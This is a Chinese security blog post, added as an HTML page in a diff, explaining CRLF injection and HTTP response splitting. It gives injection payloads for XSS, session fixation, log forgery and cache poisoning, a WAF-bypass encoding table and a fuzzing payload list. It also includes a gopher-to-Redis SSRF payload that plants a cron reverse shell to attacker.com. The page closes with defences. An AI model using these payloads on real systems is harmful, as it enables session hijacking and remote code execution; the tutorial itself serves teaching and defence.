@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>CRLF 注入（HTTP 响应拆分）</title>
+<meta name="keywords" content="CRLF 注入（HTTP 响应拆分）, 安全,渗透测试,应急响应,漏洞分析,安全运维">
+<meta name="description" content="
+一、什么是 CRLFCRLF 是 CR（回车，\r，%0d）+ LF（换行，\n，%0a） 的组合。在 HTTP 协议里，这个组合子是骨架级的角色：
+
+请求行 &#x2F; 响应行 以一个 CRLF 结尾
+每个 HTTP 头 以一个 CR">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="CRLF 注入（HTTP 响应拆分）">
+<meta property="og:description" content="
+一、什么是 CRLFCRLF 是 CR（回车，\r，%0d）+ LF（换行，\n，%0a） 的组合。在 HTTP 协议里，这个组合子是骨架级的角色：
+
+请求行 &#x2F; 响应行 以一个 CRLF 结尾
+每个 HTTP 头 以一个 CR">
+
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="54ury" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="54ury" type="application/rss+xml">
+</head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      
+      
+      <a href="https://z50n6.github.io" class="no-avatar">
+        <h1 class="site-title">54ury</h1>
+      </a>
+    </div>
+    <div class="right">
+        
+        <button type="button" class="theme-switch" id="theme-switch" aria-label="切换亮色/暗色主题" title="切换主题">
+          <svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true">
+            <circle cx="12" cy="12" r="4"></circle>
+            <path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"></path>
+          </svg>
+          <svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"></path>
+          </svg>
+        </button>
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<script>
+  // 手动切换亮/暗：写入 html.dark 并记忆到 use-color-scheme（与 head.ejs 的读取键一致）
+  (function () {
+    var btn = document.getElementById('theme-switch');
+    if (!btn) return;
+    btn.addEventListener('click', function () {
+      var isDark = document.documentElement.classList.toggle('dark');
+      try { localStorage.setItem('use-color-scheme', isDark ? 'dark' : 'light'); } catch (e) {}
+    });
+  })();
+</script>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/categories/" class="menu purple-link">
+        分类
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about/" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">CRLF 注入（HTTP 响应拆分）</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2026-06-28</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/WEB%E6%B8%97%E9%80%8F/">
+              WEB渗透
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">
+              基础漏洞
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <hr>
+<h2 id="一、什么是-CRLF"><a href="#一、什么是-CRLF" class="headerlink" title="一、什么是 CRLF"></a>一、什么是 CRLF</h2><p>CRLF 是 <strong>CR（回车，<code>\r</code>，<code>%0d</code>）+ LF（换行，<code>\n</code>，<code>%0a</code>）</strong> 的组合。在 HTTP 协议里，这个组合子是骨架级的角色：</p>
+<ul>
+<li><strong>请求行 &#x2F; 响应行</strong> 以一个 CRLF 结尾</li>
+<li><strong>每个 HTTP 头</strong> 以一个 CRLF 结尾</li>
+<li><strong>响应头与 Body 之间</strong> 用<strong>两个连续的 CRLF</strong>（<code>\r\n\r\n</code>）隔开</li>
+</ul>
+<p><a class="simple-lightbox" href="/imgs/crlf-injection/PixPin_2024-01-01_15-40-03.png"><img   src="/images/loading.svg" data-src="/imgs/crlf-injection/PixPin_2024-01-01_15-40-03.png"  alt="HTTP响应结构示意" lazyload></a></p>
+<p>说白了，浏览器和服务端就是靠 <code>\r\n</code> 来认「这个头到哪结束、Body 从哪开始」的。一旦用户输入能往响应头里塞 <code>\r\n</code>，整个响应结构就被接管了。</p>
+<hr>
+<h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p>漏洞本质：<strong>Web 应用把用户输入写进 HTTP 响应头时，没有过滤 CRLF 字符。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 典型的漏洞代码（Python Flask 示例）</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/redirect&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">redirect</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url)</span><br><span class="line">    <span class="comment"># 如果 url = &quot;http://normal.com%0d%0aSet-Cookie:evil=1&quot;</span></span><br><span class="line">    <span class="comment"># 响应变成：</span></span><br><span class="line">    <span class="comment"># Location: http://normal.com</span></span><br><span class="line">    <span class="comment"># Set-Cookie: evil=1       ← 攻击者注入的响应头</span></span><br></pre></td></tr></table></figure>
+
+<p>常见注入点：</p>
+<table>
+<thead>
+<tr>
+<th>注入位置</th>
+<th>典型参数名 &#x2F; 场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>URL 跳转参数</td>
+<td><code>?url=</code> <code>?redirect=</code> <code>?next=</code> <code>?return=</code></td>
+</tr>
+<tr>
+<td>自定义响应头</td>
+<td>从用户输入取值后 <code>set_header()</code></td>
+</tr>
+<tr>
+<td>URL 路径本身</td>
+<td><code>/path%0d%0aHeader:value</code></td>
+</tr>
+<tr>
+<td>Referer &#x2F; User-Agent 回显</td>
+<td>页面把请求头原样输出到响应</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三、利用场景"><a href="#三、利用场景" class="headerlink" title="三、利用场景"></a>三、利用场景</h2><h3 id="3-1-XSS-绕过-关闭浏览器-XSS-Filter"><a href="#3-1-XSS-绕过-关闭浏览器-XSS-Filter" class="headerlink" title="3.1 XSS 绕过 &#x2F; 关闭浏览器 XSS Filter"></a>3.1 XSS 绕过 &#x2F; 关闭浏览器 XSS Filter</h3><p>最经典的用法：先注入 <code>X-XSS-Protection: 0</code> 关掉浏览器防护，然后紧跟一个空行切开响应体，在 Body 里塞 script：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设目标参数：?redirect=xxx</span></span><br><span class="line">?redirect=%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>实际响应变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 302 Found</span><br><span class="line">Location: /home</span><br><span class="line">X-XSS-Protection: 0</span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>浏览器收到的最终响应里 Body 带 <code>&lt;script&gt;</code>，原始的跳转行为直接被废掉了。</p>
+<h3 id="3-2-会话固定（Set-Cookie-注入）"><a href="#3-2-会话固定（Set-Cookie-注入）" class="headerlink" title="3.2 会话固定（Set-Cookie 注入）"></a>3.2 会话固定（Set-Cookie 注入）</h3><p>控制响应头就能给用户强制种一个攻击者指定的 Cookie：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?redirect=/%0d%0aSet-Cookie:JSPSESSID=attacker123;%20Path=/</span><br></pre></td></tr></table></figure>
+
+<p><strong>攻击链条：</strong></p>
+<ol>
+<li>攻击者构造恶意 URL → 发给受害者</li>
+<li>受害者点击 → 浏览器被种下 <code>JSPSESSID=attacker123</code></li>
+<li>受害者用这个 Session 完成登录认证</li>
+<li>攻击者用同样的 Session ID → 直接进入已认证会话</li>
+</ol>
+<h3 id="3-3-日志伪造"><a href="#3-3-日志伪造" class="headerlink" title="3.3 日志伪造"></a>3.3 日志伪造</h3><p>如果应用把请求参数写进日志且没过滤换行符，攻击者可以插入伪造的日志条目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入 username = normal_user%0d%0a[2026-06-28 10:00] CRITICAL: Server shutdown by admin</span><br><span class="line"></span><br><span class="line">日志文件变成：</span><br><span class="line">[2026-06-28 10:00] ERROR: Login failed for user: normal_user</span><br><span class="line">[2026-06-28 10:00] CRITICAL: Server shutdown by admin   ← 伪造的</span><br></pre></td></tr></table></figure>
+
+<p>不止误导运维——污染后的日志如果喂给 SIEM&#x2F;SOAR 或 AI 分析模型，可能触发自动化误操作。</p>
+<h3 id="3-4-缓存投毒"><a href="#3-4-缓存投毒" class="headerlink" title="3.4 缓存投毒"></a>3.4 缓存投毒</h3><p>如果响应经过 CDN 或反向代理缓存，注入的恶意响应头会被缓存下来，影响所有后续用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/%0d%0aCache-Control:public,max-age=86400%0d%0a%0d%0a&lt;script&gt;...&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一次注入，全站用户中招——被污染的缓存页一直蹲在那，谁来谁倒霉。</p>
+<h3 id="3-5-SSRF-CRLF-打内网"><a href="#3-5-SSRF-CRLF-打内网" class="headerlink" title="3.5 SSRF + CRLF 打内网"></a>3.5 SSRF + CRLF 打内网</h3><p>这是 CRLF 危害最大的一种玩法。SSRF 给了内网可达性，CRLF 给了协议走私能力：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击路径：</span><br><span class="line">[公网] → SSRF 漏洞 → 内网 Redis:6379 → CRLF 注入 RESP 命令 → RCE</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gopher 协议打 Redis（利用 CRLF 构造 RESP 协议命令）</span></span><br><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a<span class="variable">$8</span>%0d%0aflushall%0d%0a</span><br><span class="line">  *3%0d%0a<span class="variable">$3</span>%0d%0aset%0d%0a<span class="variable">$1</span>%0d%0a1%0d%0a<span class="variable">$64</span>%0d%0a</span><br><span class="line">  */1 * * * * bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1%0d%0a</span><br></pre></td></tr></table></figure>
+
+<p>Redis RESP 协议本身就是用 CRLF 分隔命令的，SSRF + CRLF 就是塞 Redis 命令的钥匙。</p>
+<hr>
+<h2 id="四、绕过手法"><a href="#四、绕过手法" class="headerlink" title="四、绕过手法"></a>四、绕过手法</h2><p>WAF 和过滤规则日常盯的是 <code>%0d%0a</code> 和 <code>\r\n</code> 这些直白写法：</p>
+<table>
+<thead>
+<tr>
+<th>绕过方式</th>
+<th>Payload</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>双重 URL 编码</td>
+<td><code>%250d%250a</code></td>
+<td>WAF 解码一次得 <code>%0d%0a</code>，应用再解码一次生效</td>
+</tr>
+<tr>
+<td>Unicode 绕过（Node.js &lt; v10）</td>
+<td><code>čĊ</code>（<code>čĊ</code>）</td>
+<td>高位截断后 č → <code>\r</code>，Ċ → <code>\n</code></td>
+</tr>
+<tr>
+<td>只用 LF</td>
+<td><code>%0a</code></td>
+<td>很多场景仅换行就能分隔，规则只知道拦 <code>%0d%0a</code></td>
+</tr>
+<tr>
+<td>只用 CR</td>
+<td><code>%0d</code></td>
+<td>旧版浏览器 &#x2F; 服务器对孤立的 <code>\r</code> 也认</td>
+</tr>
+<tr>
+<td>注释前缀干扰</td>
+<td><code>%23%0d%0a</code></td>
+<td><code>#</code> 让前面的内容变成注释，绕过正则检测</td>
+</tr>
+<tr>
+<td>问号前缀</td>
+<td><code>%3f%0d%0a</code></td>
+<td>参数分隔符混淆过滤引擎</td>
+</tr>
+<tr>
+<td>多层编码</td>
+<td><code>%2525250d%2525250a</code></td>
+<td>多层递归解码埋过 WAF 的检测深度</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="五、检测与-Fuzz"><a href="#五、检测与-Fuzz" class="headerlink" title="五、检测与 Fuzz"></a>五、检测与 Fuzz</h2><h3 id="5-1-Payload-字典"><a href="#5-1-Payload-字典" class="headerlink" title="5.1 Payload 字典"></a>5.1 Payload 字典</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 基础探测</span><br><span class="line">%0d%0aInjected-Header:test</span><br><span class="line">%0aInjected-Header:test</span><br><span class="line">%0dInjected-Header:test</span><br><span class="line"></span><br><span class="line"># 编码绕过</span><br><span class="line">/%250aHeader:test</span><br><span class="line">/%u000aHeader:test</span><br><span class="line"></span><br><span class="line"># 关 XSS Filter + 写 Body</span><br><span class="line">%0d%0aX-XSS-Protection:0%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"># Set-Cookie</span><br><span class="line">%0d%0aSet-Cookie:crlftest=1</span><br><span class="line"></span><br><span class="line"># Location 覆盖</span><br><span class="line">%0d%0aLocation:http://evil.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-工具"><a href="#5-2-工具" class="headerlink" title="5.2 工具"></a>5.2 工具</h3><ul>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/dwisiswant0/crlfuzz">crlfuzz</a></strong> — Go 写的专业 CRLF 扫描器，速度快，支持自定义 Payload 列表</li>
+<li><strong>Burp Intruder</strong> — 把上面的 Payload 字典灌进去逐条跑</li>
+<li><strong>手动 curl</strong>：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">&quot;https://target.com/path?param=test%0d%0aInjected:1&quot;</span></span><br><span class="line"><span class="comment"># 看响应头里有没有 &quot;Injected:1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、防御"><a href="#六、防御" class="headerlink" title="六、防御"></a>六、防御</h2><table>
+<thead>
+<tr>
+<th>层级</th>
+<th>措施</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>输入</td>
+<td>拦截 <code>\r</code>、<code>\n</code>、<code>%0d</code>、<code>%0a</code> 及 Unicode 等价字符，<strong>白名单</strong>优于黑名单</td>
+</tr>
+<tr>
+<td>输出</td>
+<td>写入响应头前，对控制字符做 URL 编码或直接拒绝写入</td>
+</tr>
+<tr>
+<td>框架</td>
+<td>用语言 &#x2F; 框架自带 API：Java <code>setHeader()</code> 会在值含换行时抛异常、Node.js <code>response.setHeader()</code> 同理。<strong>永远不要手动拼字符串进响应头</strong></td>
+</tr>
+<tr>
+<td>架构</td>
+<td>CDN &#x2F; 反向代理层加 CRLF 过滤；对敏感响应禁用缓存或加 <code>Vary</code> 头</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="七、案例参考"><a href="#七、案例参考" class="headerlink" title="七、案例参考"></a>七、案例参考</h2><ul>
+<li><a href="../../../03-%E5%AE%89%E5%85%A8%E8%B5%84%E6%BA%90/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Nginx/Nginx%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E6%BC%8F%E6%B4%9E.md">Nginx 配置错误导致漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/fastergohome/article/details/102313310">SSRF+CRLF 组合利用分析</a></li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/papers/Archive/drops2/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">CRLF Injection 的利用与实例分析（先知社区）</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-4rr6-2v9v-wcpc">CVE-2024-45302 — RestSharp CRLF 注入</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5868">CVE-2017-5868 — OpenVPN CRLF + Session Fixation</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>记住一点</strong>：CRLF 注入本身不是终点，它是一把钥匙——开了门之后是 XSS、会话劫持、内网渗透还是缓存投毒，全看后面怎么组合。</p>
+</blockquote>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-CRLF"><span class="top-box-text">一、什么是 CRLF</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="top-box-text">二、漏洞原理</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="top-box-text">三、利用场景</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-1-XSS-%E7%BB%95%E8%BF%87-%E5%85%B3%E9%97%AD%E6%B5%8F%E8%A7%88%E5%99%A8-XSS-Filter"><span class="top-box-text">3.1 XSS 绕过 &#x2F; 关闭浏览器 XSS Filter</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-2-%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%EF%BC%88Set-Cookie-%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="top-box-text">3.2 会话固定（Set-Cookie 注入）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-3-%E6%97%A5%E5%BF%97%E4%BC%AA%E9%80%A0"><span class="top-box-text">3.3 日志伪造</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-4-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="top-box-text">3.4 缓存投毒</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#3-5-SSRF-CRLF-%E6%89%93%E5%86%85%E7%BD%91"><span class="top-box-text">3.5 SSRF + CRLF 打内网</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%9B%9B%E3%80%81%E7%BB%95%E8%BF%87%E6%89%8B%E6%B3%95"><span class="top-box-text">四、绕过手法</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E-Fuzz"><span class="top-box-text">五、检测与 Fuzz</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-1-Payload-%E5%AD%97%E5%85%B8"><span class="top-box-text">5.1 Payload 字典</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-2-%E5%B7%A5%E5%85%B7"><span class="top-box-text">5.2 工具</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81%E9%98%B2%E5%BE%A1"><span class="top-box-text">六、防御</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81%E6%A1%88%E4%BE%8B%E5%8F%82%E8%80%83"><span class="top-box-text">七、案例参考</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2026/06/28/arbitrary-file-read/">
+          <h3 class="post-title">
+            
+            下一篇：任意文件读取 / 下载
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
